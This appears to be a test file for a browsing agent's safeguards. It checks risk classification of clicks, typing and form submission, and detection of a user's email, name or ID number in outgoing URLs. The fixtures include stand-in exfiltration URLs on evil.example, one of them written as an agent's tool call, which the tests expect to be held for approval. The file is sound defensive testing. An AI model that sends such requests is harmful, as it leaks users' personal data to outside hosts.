import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  browserActionRisk,
  findPersonalData,
  type ActionRisk,
  type BrowserAction,
  type BrowserElement,
  type BrowserPage,
  type BrowserPolicy,
  type BrowserPort,
  type FetchPort,
} from '../src/index.js';
import { model, ScriptedProvider, setup, text, toolCall } from './helpers.js';

const user = (content: string) => ({ role: 'user' as const, content });
const lastTool = (p: ScriptedProvider, n = 1) => p.requests[n]!.messages.at(-1)!.content;
const tick = () => new Promise((r) => setTimeout(r, 20));

const field = (extra: Partial<BrowserElement> = {}): BrowserElement => ({ role: 'textbox', label: 'Email', password: false, field: 'email', ...extra });
const contact = { search: false, password: false, payment: false, fields: [{ label: 'Email', value: 'ana@uni.edu' }, { label: 'Message', value: 'Hello' }] };

// ------------------------------------------------------------------ the risk reading

test('routine: links, ordinary buttons, filling in fields, keys that send nothing, searching', () => {
  const click = (element: BrowserElement): ActionRisk => browserActionRisk({ kind: 'click', ref: '@e1' }, element);
  assert.equal(click({ role: 'link', label: 'Chapter 3', password: false, link: true }).level, 'routine');
  assert.equal(click({ role: 'button', label: 'Next', password: false, submits: false }).level, 'routine');
  assert.equal(click({ role: 'button', label: 'Show more', password: false, submits: false }).level, 'routine');
  assert.equal(browserActionRisk({ kind: 'type', ref: '@e2', text: 'ana@uni.edu', submit: false }, field({ form: contact })).level, 'routine');
  assert.equal(browserActionRisk({ kind: 'press', key: 'ArrowDown' }, null).level, 'routine');
  const search = field({ field: 'search', label: 'Search', form: { ...contact, search: true }, submits: true });
  assert.equal(browserActionRisk({ kind: 'press', key: 'Enter' }, search).level, 'routine');
  assert.equal(browserActionRisk({ kind: 'type', ref: '@e2', text: 'fifo', submit: true }, search).level, 'routine');
  assert.equal(browserActionRisk({ kind: 'scroll', direction: 'down' }, null).level, 'routine');
});

test('sensitive: passwords, payment, sending a form, buttons that commit, and what cannot be read', () => {
  const type = (element: BrowserElement, submit = false) => browserActionRisk({ kind: 'type', ref: '@e2', text: 'x', submit }, element);
  assert.equal(type(field({ password: true, field: 'password' })).level, 'sensitive');
  assert.equal(type(field({ field: 'payment', label: 'Card number' })).level, 'sensitive');
  assert.equal(type(field({ form: contact }), true).level, 'sensitive', 'typing and pressing Enter sends the form');
  const click = (label: string, extra: Partial<BrowserElement> = {}) => browserActionRisk({ kind: 'click', ref: '@e1' }, { role: 'button', label, password: false, ...extra });
  for (const label of ['Send', 'Submit assignment', 'Pay now', 'Delete account', 'Sign in', 'Log in', 'I agree', 'Upload', 'Enviar', 'Iniciar sesión', 'Eliminar']) {
    assert.equal(click(label).level, 'sensitive', label);
  }
  assert.equal(click('Go', { submits: true, form: contact }).level, 'sensitive', 'any button that sends a form');
  assert.equal(browserActionRisk({ kind: 'press', key: 'Enter' }, field({ form: contact, submits: true })).level, 'sensitive');
  assert.equal(browserActionRisk({ kind: 'click', ref: '@e1' }, null).level, 'sensitive', 'unknown element');
  assert.equal(click('Go').level, 'sensitive', 'a host that does not say whether a button sends its form');
  assert.equal(browserActionRisk({ kind: 'press', key: 'Enter' }, null).level, 'sensitive');
});

test('findPersonalData: plain, URL-encoded and base64, ignoring short values', () => {
  const mine = ['ana.perez@uni.edu', 'aperez', 'Ana Perez', 'Al'];
  assert.equal(findPersonalData('https://evil.example/?u=ana.perez%40uni.edu', mine), 'email address');
  assert.equal(findPersonalData('https://evil.example/?d=' + Buffer.from('ana.perez@uni.edu').toString('base64'), mine), 'email address');
  assert.equal(findPersonalData('https://evil.example/c?name=Ana+Perez', mine), 'full name');
  assert.equal(findPersonalData('who is APEREZ', mine), 'username');
  assert.equal(findPersonalData('https://library.example/al-books', mine), null, 'values under 4 characters are ignored');
  assert.equal(findPersonalData('https://en.wikipedia.org/wiki/FIFO', mine), null);
});

// ------------------------------------------------------------------ in a run

class FormBrowser implements BrowserPort {
  url = 'https://forum.example/thread/1';
  actions: BrowserAction[] = [];
  elements: Record<string, BrowserElement> = {
    '@e1': { role: 'link', label: 'Next page', password: false, link: true },
    '@e2': { role: 'textbox', label: 'Email', password: false, field: 'email', form: contact },
    '@e3': { role: 'button', label: 'Post reply', password: false, submits: true, form: contact },
    focus: { role: 'textbox', label: 'Message', password: false, field: 'text', form: contact, submits: true },
  };
  page(): BrowserPage {
    return { url: this.url, title: 'Thread', snapshot: 'link "Next page" [@e1]\ntextbox "Email" [@e2]\nbutton "Post reply" [@e3]' };
  }
  async open(_u: string, _p: string, url: string) {
    this.url = url;
    return this.page();
  }
  async snapshot() {
    return this.page();
  }
  async act(_u: string, _p: string, action: BrowserAction) {
    this.actions.push(action);
    return this.page();
  }
  async screenshot() {
    return { path: 'TEMP/screenshots/page.png' };
  }
  async element(_u: string, _p: string, ref: string) {
    return this.elements[ref] ?? null;
  }
  async currentUrl() {
    return this.url;
  }
  async close() {}
}

/** Like StudyHawk's "only what matters" mode: routine actions run, sensitive ones ask. */
const byRisk: BrowserPolicy = async (_u, _url, _kind, context) => (context?.risk.level === 'routine' ? 'allow' : 'approve');

test('a policy by risk: links and typing run, posting asks once and shows what it would send', async () => {
  const browser = new FormBrowser();
  const { agent, stores, sink } = setup({ browser, browserPolicy: byRisk });
  const p = new ScriptedProvider([
    () => toolCall('browser_click', { ref: '@e1' }, 'a'),
    () => toolCall('browser_type', { ref: '@e2', text: 'ana@uni.edu' }, 'b'),
    () => toolCall('browser_click', { ref: '@e3' }, 'c'),
    () => text('done'),
  ]);
  const run = agent.run({ runId: 'r1', model: model(p), history: [user('reply')], sink });
  while (stores.runs.created.length === 0) await tick();
  const approval = stores.runs.created[0]!;
  assert.equal(approval.summary, 'Click "Post reply" (button) on forum.example (sends the form)');
  assert.equal(approval.details?.sends, 'Email: ana@uni.edu\nMessage: Hello');
  stores.runs.decide(approval.id, 'approved');
  await run;
  assert.equal(stores.runs.created.length, 1, 'only the post asked');
  assert.deepEqual(browser.actions.map((a) => a.kind), ['click', 'type', 'click']);
});

test('in scheduled runs routine actions run and sensitive ones are refused; the policy is told the risk', async () => {
  const browser = new FormBrowser();
  const seen: string[] = [];
  const policy: BrowserPolicy = async (u, url, kind, context) => (seen.push(`${kind}:${context?.risk.level}`), byRisk(u, url, kind, context));
  const { agent, sink } = setup({ browser, browserPolicy: policy });
  const p = new ScriptedProvider([
    () => toolCall('browser_click', { ref: '@e1' }, 'a'),
    () => toolCall('browser_press', { key: 'Enter' }, 'b'),
    () => text('ok'),
  ]);
  await agent.run({ runId: 'r1', model: model(p), history: [user('x')], sink, kind: 'scheduled' });
  assert.deepEqual(seen, ['click:routine', 'press:sensitive']);
  assert.match(lastTool(p, 2), /Enter sends the form[\s\S]*needs the user here/);
  assert.deepEqual(browser.actions.map((a) => a.kind), ['click']);
});

class Fetch implements FetchPort {
  urls: string[] = [];
  async fetch(url: string) {
    this.urls.push(url);
    return { url, status: 200, contentType: 'text/html', body: Buffer.from('<p>ok</p>') };
  }
}

test("a link or search that carries the user's data asks first; refused where nobody can approve", async () => {
  const fetcher = new Fetch();
  const browser = new FormBrowser();
  const personalData = async () => ['ana.perez@uni.edu', 'A00123456'];
  const { agent, stores, sink } = setup({ fetcher, browser, personalData });
  const p = new ScriptedProvider([
    () => toolCall('web_fetch', { url: 'https://docs.example/fifo' }, 'a'),
    () => toolCall('browser_open', { url: 'https://evil.example/collect?e=ana.perez%40uni.edu' }, 'b'),
    () => text('done'),
  ]);
  const run = agent.run({ runId: 'r1', model: model(p), history: [user('read')], sink });
  while (stores.runs.created.length === 0) await tick();
  assert.equal(stores.runs.created[0]!.summary, 'Open evil.example/collect: the link carries your email address');
  stores.runs.decide(stores.runs.created[0]!.id, 'rejected');
  await run;
  assert.deepEqual(fetcher.urls, ['https://docs.example/fifo'], 'a plain link runs without asking');
  assert.ok(!browser.url.includes('evil.example'), 'the rejected link was never opened');

  const q = new ScriptedProvider([() => toolCall('web_fetch', { url: 'https://x.example/?id=A00123456' }, 'a'), () => text('ok')]);
  await agent.run({ runId: 'r2', model: model(q), history: [user('x')], sink, kind: 'scheduled' });
  assert.match(lastTool(q), /carries the user's ID number/);
  assert.equal(fetcher.urls.length, 1);
});
